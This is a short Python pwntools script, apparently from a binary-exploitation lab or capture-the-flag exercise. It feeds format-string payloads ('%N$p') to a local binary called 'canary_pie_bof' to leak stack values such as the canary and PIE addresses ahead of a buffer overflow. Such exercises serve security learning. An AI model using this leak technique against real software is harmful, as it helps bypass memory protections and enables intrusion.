from pwn import *

context.binary = "./canary_pie_bof"
context.log_level = "error"

for i in range(1, 80):
	p = process("./canary_pie_bof")
	p.recvuntil(b"leak?\n")

	payload = f"%{i}$p".encode()
	p.sendline(payload)

	out = p.recvuntil(b"stage2:", timeout = 0.5)
	print(i, out)
	
	p.close()
